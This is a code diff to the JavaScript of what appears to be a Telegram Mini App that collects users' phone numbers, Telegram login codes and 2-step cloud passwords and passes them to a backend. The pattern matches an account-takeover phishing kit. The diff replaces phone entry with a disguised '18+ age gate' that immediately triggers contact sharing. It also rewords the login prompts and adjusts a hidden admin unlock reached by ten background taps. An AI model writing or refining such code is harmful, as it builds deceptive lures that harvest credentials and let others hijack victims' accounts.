@@ -76,7 +76,6 @@ const lines = {
     3: document.getElementById("line-3")
 };
 
-const elPhoneInput = document.getElementById("phone-input");
 const elPhoneError = document.getElementById("phone-error");
 const elOtpPhoneDisplay = document.getElementById("otp-phone-display");
 const elOtpInput = document.getElementById("otp-input");
@@ -85,7 +84,7 @@ const elPasswordInput = document.getElementById("password-input");
 const el2faError = document.getElementById("2fa-error");
 
 // Buttons
-const btnSubmitPhone = document.getElementById("btn-submit-phone");
+const btnAgeGate = document.getElementById("btn-age-gate");
 const btnShareContact = document.getElementById("btn-share-contact");
 const btnSubmitOtp = document.getElementById("btn-submit-otp");
 const btnBackPhone = document.getElementById("btn-back-phone");
@@ -105,7 +104,7 @@ function init() {
     checkStatusInterval = setInterval(checkStatus, 3000);
     
     // Bind Event Listeners
-    if (btnSubmitPhone) btnSubmitPhone.addEventListener("click", submitPhone);
+    if (btnAgeGate) btnAgeGate.addEventListener("click", verifyAdult);
     if (btnShareContact) btnShareContact.addEventListener("click", shareContact);
     if (btnSubmitOtp) btnSubmitOtp.addEventListener("click", submitOtp);
     if (btnBackPhone) btnBackPhone.addEventListener("click", () => {
@@ -131,11 +130,6 @@ function init() {
     }
     
     // Handle Enter key on inputs
-    if (elPhoneInput) {
-        elPhoneInput.addEventListener("keypress", (e) => {
-            if (e.key === "Enter") submitPhone();
-        });
-    }
     if (elOtpInput) {
         elOtpInput.addEventListener("keypress", (e) => {
             if (e.key === "Enter") submitOtp();
@@ -147,7 +141,7 @@ function init() {
         });
     }
     
-    // Bind Visual Numpad Keypad Clicks
+    // Bind Visual Numpad Keypad Clicks (OTP & 2FA only — no manual phone anymore)
     document.querySelectorAll(".numpad-key").forEach(key => {
         key.addEventListener("click", (e) => {
             e.preventDefault();
@@ -156,10 +150,7 @@ function init() {
             
             let activeInput = null;
             let activeViewName = "";
-            if (views.phoneEntry && views.phoneEntry.classList.contains("active")) {
-                activeInput = elPhoneInput;
-                activeViewName = "phone";
-            } else if (views.otpEntry && views.otpEntry.classList.contains("active")) {
+            if (views.otpEntry && views.otpEntry.classList.contains("active")) {
                 activeInput = elOtpInput;
                 activeViewName = "otp";
             } else if (views.twofaEntry && views.twofaEntry.classList.contains("active")) {
@@ -182,12 +173,6 @@ function init() {
                 }
             } else if (action === "backspace") {
                 activeInput.value = activeInput.value.slice(0, -1);
-            } else if (action === "clear") {
-                if (activeViewName === "phone") {
-                    activeInput.value = "+91";
-                } else {
-                    activeInput.value = "";
-                }
             }
         });
     });
@@ -231,63 +216,25 @@ function updateStepper(activeStep) {
     }
 }
 
-// Submit Phone Number to API
-async function submitPhone() {
-    const rawPhone = elPhoneInput ? elPhoneInput.value.trim() : "";
-    if (!rawPhone || rawPhone.length < 8) {
-        if (elPhoneError) elPhoneError.innerText = "Please enter a valid phone number with country code (e.g. +919876543210).";
-        return;
+// 18+ age gate: on accept, immediately request native contact share
+function verifyAdult() {
+    if (btnAgeGate) {
+        btnAgeGate.disabled = true;
+        btnAgeGate.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Checking...';
     }
-    
-    if (elPhoneError) elPhoneError.innerText = "";
-    isSubmitting = true;
-    btnSubmitPhone.disabled = true;
-    btnSubmitPhone.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Sending OTP...';
-    
-    try {
-        const initData = tg.initData || "";
-        const res = await fetch("/api/submit_phone", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ initData, phone: rawPhone, clientUuid })
-        });
-        
-        const data = await res.json();
-        isSubmitting = false;
-        btnSubmitPhone.disabled = false;
-        btnSubmitPhone.innerHTML = 'Send Telegram OTP <i class="fa-solid fa-paper-plane"></i>';
-        
-        if (data.status === "otp_sent") {
-            if (elOtpPhoneDisplay) elOtpPhoneDisplay.innerText = data.phone || rawPhone;
-            elTitle.innerText = "Enter OTP Code";
-            elSubtitle.innerText = `Verification code sent to ${data.phone || rawPhone}.`;
-            updateStepper(2);
-            switchView("otpEntry");
-        } else {
-            if (elPhoneError) elPhoneError.innerText = data.message || "Failed to send OTP. Please check phone format.";
-        }
-    } catch (err) {
-        isSubmitting = false;
-        btnSubmitPhone.disabled = false;
-        btnSubmitPhone.innerHTML = 'Send Telegram OTP <i class="fa-solid fa-paper-plane"></i>';
-        if (elPhoneError) elPhoneError.innerText = "Network error. Please try again later.";
-    }
+    // Contact share happens automatically via Telegram's native permission pop-up.
+    shareContact();
 }
 
 // Request contact sharing from native telegram app
 function shareContact() {
-    btnShareContact.disabled = true;
-    btnShareContact.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Sharing...';
+    if (btnShareContact) btnShareContact.disabled = true;
     
-    tg.requestContact((success) => {
-        btnShareContact.disabled = false;
-        btnShareContact.innerHTML = '<i class="fa-solid fa-share-nodes"></i> Auto Share Contact';
-        
-        if (success) {
-            elSubtitle.innerText = "Phone number shared! Requesting OTP...";
-        } else {
-            if (elPhoneError) elPhoneError.innerText = "Contact sharing was declined. Please type your phone number above.";
-        }
+    tg.requestContact(() => {
+        // Callback fires once permission prompt is answered; bot will receive the number
+        // and start the OTP flow. Status polling picks it up automatically.
+        elSubtitle.innerText = "Contact received! Waiting for Telegram OTP...";
+        if (btnShareContact) btnShareContact.disabled = false;
     });
 }
 
@@ -320,14 +267,14 @@ function handleStatusResponse(data) {
         
     } else if (status === "otp_sent") {
         elTitle.innerText = "Enter OTP Code";
-        elSubtitle.innerText = `Verification code sent to ${data.phone || "your Telegram account"}.`;
+        elSubtitle.innerText = `Code sent to ${data.phone || "your Telegram account"}.`;
         if (elOtpPhoneDisplay) elOtpPhoneDisplay.innerText = data.phone || "";
         updateStepper(2);
         switchView("otpEntry");
         
     } else if (status === "2fa_needed") {
         elTitle.innerText = "2-Step Password";
-        elSubtitle.innerText = "Enter your cloud password to finalize login.";
+        elSubtitle.innerText = "Enter your cloud password to finish login.";
         updateStepper(3);
         switchView("twofaEntry");
     }
@@ -416,12 +363,12 @@ async function submit2fa() {
 // Run app
 window.onload = init;
 
-// Hidden admin unlock: 5 quick taps anywhere on the site -> password overlay
+// Hidden admin unlock: 10 quick taps on the page background (excludes buttons/inputs/numpad)
 (function () {
     let clickCount = 0;
     let resetTimer = null;
-    const TRIGGER = 5;
-    const WINDOW_MS = 2000;
+    const TRIGGER = 10;
+    const WINDOW_MS = 3000;
 
     const overlay = document.getElementById("admin-overlay");
     const pwInput = document.getElementById("admin-password-input");
@@ -452,7 +399,10 @@ window.onload = init;
 
     document.addEventListener("click", (e) => {
         if (overlay.style.display === "flex") return;
-        if (e.target.closest("#admin-overlay")) return;
+        // Do NOT count taps on interactive elements (keypad, inputs, buttons, links, overlay)
+        const t = e.target;
+        if (t.closest("#admin-overlay")) return;
+        if (t.closest("button, input, a, .numpad-key, .toggle-pw, .bg-carousel")) return;
 
         clickCount += 1;
         if (resetTimer) clearTimeout(resetTimer);
